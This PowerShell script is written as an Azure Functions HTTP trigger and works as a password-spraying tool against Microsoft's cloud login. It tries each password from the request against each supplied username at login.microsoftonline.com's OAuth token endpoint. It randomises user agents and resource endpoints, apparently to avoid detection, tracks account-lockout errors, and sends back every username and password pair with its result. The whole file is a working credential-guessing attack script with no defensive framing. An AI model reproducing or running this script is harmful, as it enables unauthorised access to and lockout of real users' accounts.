using namespace System.Net

# Input bindings are passed in via param block.
param($Request, $TriggerMetadata)

Function Post-Results {
    [CmdletBinding()]
    param (
        [Parameter()]
        [object]$RawContent
    )

    Push-OutputBinding -Name Response -Value ([HttpResponseContext]@{
        StatusCode = [HttpStatusCode]::OK
        Body       = $RawContent | ConvertTo-Json
    })

}

# Write to the Azure Functions log stream.
Write-Host "PowerShell HTTP trigger function processed a request."
$Request = $Request.RawBody | ConvertFrom-Json
# Interact with query parameters or the body of the request.
$userList = $Request.UserList
$passwords = $Request.Passwords

$logo = '   

                -- L E T S   S T A R T   R A T T I N G --

'

#Clear-Host
Write-Host $logo -ForegroundColor Green
Write-Host $userList
$constants = Get-Content "constants.json" | ConvertFrom-Json

$ErrorActionPreference = 'silentlycontinue'
$usernames = $UserList | Sort-Object { Get-Random }
$currenttime = Get-Date
$count = $Usernames.count
$curr_user = 0
$lockout_count = 0

$dataHash = New-Object System.Collections.ArrayList
$script:fullresults = @()

if ($PasswordList) {
    $Passwords = Get-Content $PasswordList
}
Write-Host -ForegroundColor "yellow" ("[*] There are " + $count + " total users to spray.")
Write-Host -ForegroundColor "yellow" "[*] Current date and time: $currenttime"

# Setting up the web request
$requestParams = @{
    Method = 'POST'
    Uri    = "https://login.microsoftonline.com/common/oauth2/token"
    Body   = @{
        resource    = ''
        client_info = '1'
        grant_type  = 'password'
        client_id   = '1b730954-1685-4b74-9bfd-dac224a7b894'
        scope       = 'openid'
    }
}

foreach ($username in $usernames) {
    # User counter
    $curr_user += 1
    Write-Host -nonewline "$username of $count users tested`r"

    $requestParams.Body.username = $username
    $requestParams.Body.resource = ( $constants.endpoints.value | Get-Random )
    
    foreach ($password in $Passwords ) {
        $agent = ($constants.agents.value | Get-Random)
        $requestParams.Body.password = "$password"
        $null = Invoke-WebRequest @requestParams -ErrorVariable ErrMsg -UserAgent $agent
    

        # If we get a 200 response code it's a valid cred
        
        $currentItem = [PSCustomObject]@{
            "username"  = $requestParams.Body.username
            "password"  = $requestParams.Body.password
            "agent"     = "$agent"
            "endpoint"  = $requestParams.Body.resource
            "ErrorCode" = ((($ErrMsg.ErrorRecord | ConvertFrom-Json).error_codes) -split '\n')[0]
            "ErrorMsg"  = ((($ErrMsg.ErrorRecord | ConvertFrom-Json).error_description) -split '\n')[0]
        }

        if ($currentItem.ErrorMsg -like "*50053*" ) {
            $lockout_count++
        
            if ($lockout_count -gt 5) {
                $currentItem = [PSCustomObject]@{
                    "lockout"  = $true
                }
                $null = $dataHash.Add($currentItem)
                Post-Results -RawContent $dataHash
            
            }
        }
        $null = $dataHash.Add($currentItem)
    }
}

Post-Results -RawContent $dataHash